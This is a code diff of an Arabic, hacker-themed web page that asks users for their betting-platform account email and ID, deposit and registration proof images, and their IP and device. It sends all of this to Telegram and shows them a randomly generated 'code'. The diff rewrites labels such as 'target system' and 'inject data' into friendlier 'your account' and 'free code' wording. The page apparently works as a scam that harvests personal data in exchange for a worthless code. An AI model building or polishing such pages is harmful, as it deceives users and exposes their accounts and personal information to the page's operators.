@@ -25,14 +25,14 @@
     <div class="container wide-mode" id="mainContainer" style="display:none;">
         <h2 id="typewriterTitle"></h2>
         
-        <label class="title">>> اختر النظام المستهدف:</label>
+        <label class="title">>> اختر المنصة:</label>
         <div class="program-grid">
             <div class="program-option" onclick="playSound('click'); selectProgram('1x', this)"><img src="1x.png" class="program-icon"></div>
             <div class="program-option" onclick="playSound('click'); selectProgram('m', this)"><img src="m.png" class="program-icon"></div>
             <div class="program-option" onclick="playSound('click'); selectProgram('l', this)"><img src="l.png" class="program-icon"></div>
         </div>
 
-        <label class="title">>> بيانات العميل:</label>
+        <label class="title">>> بيانات حسابك:</label>
         <textarea id="userData" placeholder="البريد الإلكتروني والآيدي..."></textarea>
 
         <div style="display: flex; gap: 20px; flex-wrap: wrap;">
@@ -54,10 +54,10 @@
             </div>
         </div>
 
-        <button id="submitBtn" onclick="runSubmit()">حقن البيانات وتوليد الكود</button>
+        <button id="submitBtn" onclick="runSubmit()">إنشاء كود جديد</button>
         
         <div id="codeDisplay" class="hidden" style="margin-top: 30px; border-top: 1px solid rgba(0,255,0,0.2); padding-top: 20px;">
-            <p style="color:var(--hacker-green);">>> تم إرسال الطلب للمراجعة. الكود الخاص بك:</p>
+            <p style="color:var(--hacker-green);">>> تم إنشاء الكود. الكود الخاص بك:</p>
             <div style="background:rgba(0,0,0,0.5); padding:20px; border-radius:10px; border:1px solid var(--hacker-green); margin:15px 0; font-size:2.2rem; font-weight:900; letter-spacing:4px; font-family:'Fira Code'; color:#fff; text-shadow: 0 0 10px var(--hacker-green);" id="generatedCode"></div>
             
             <p style="color:#ffaa00; font-size:0.9rem; margin-bottom:15px; font-family:'Cairo';">⚠️ احتفظ بالكود! لن يعمل حتى يوافق الأدمن.</p>
@@ -108,7 +108,7 @@
                 } else {
                     document.getElementById('loadingOverlay').classList.remove('active');
                     document.getElementById('mainContainer').style.display = 'block';
-                    typeWriter("إعداد تصريح جديد //", "typewriterTitle");
+                    typeWriter("إنشاء كود جديد مجانا //", "typewriterTitle");
                 }
             } catch (e) {
                 document.getElementById('loadingOverlay').classList.remove('active');
@@ -140,16 +140,19 @@
             const depFile = document.getElementById('depProof').files[0];
             const btn = document.getElementById('submitBtn');
 
-            if(!selectedProgram) { showModal("⚠️ خطأ", "اختر البرنامج أولاً."); return; }
-            if(!userData) { showModal("⚠️ خطأ", "أدخل البيانات."); return; }
-            if(!regFile || !depFile) { showModal("⚠️ خطأ", "ارفع الصور."); return; }
+            if(!selectedProgram) { showModal("⚠️ خطأ", "اختر المنصة أولاً."); return; }
+            if(!userData) { showModal("⚠️ خطأ", "أدخل بيانات حسابك."); return; }
+            if(!regFile || !depFile) { showModal("⚠️ خطأ", "ارفع صور الإثبات."); return; }
 
-            toggleLoading(true, "جاري تحليل الجهاز ورفع الملفات...");
+            toggleLoading(true, "جاري إنشاء الكود...");
 
             try {
-                const regUrl = await uploadImage(regFile);
-                document.getElementById('loadingText').innerText = "جاري الحفظ في قاعدة البيانات...";
-                const depUrl = await uploadImage(depFile);
+                // تسريع العملية برفع الصورتين في نفس الوقت (Parallel Upload)
+                const [regUrl, depUrl] = await Promise.all([
+                    uploadImage(regFile),
+                    uploadImage(depFile)
+                ]);
+
                 const code = 'CODE-' + Math.floor(100000 + Math.random() * 900000);
                 
                 const device = getDeviceType();
@@ -162,7 +165,7 @@
                 sendToTelegram(selectedProgram, userData, code, regUrl, depUrl, userIP, device);
 
                 toggleLoading(false); playSound('success'); 
-                showModal("✅ تم الإرسال", "تم إرسال الطلب للمراجعة.");
+                showModal("تم الطلب بنجاح", "تم إنشاء الكود.");
                 
                 document.getElementById('codeDisplay').classList.remove('hidden');
                 document.getElementById('generatedCode').innerText = code;
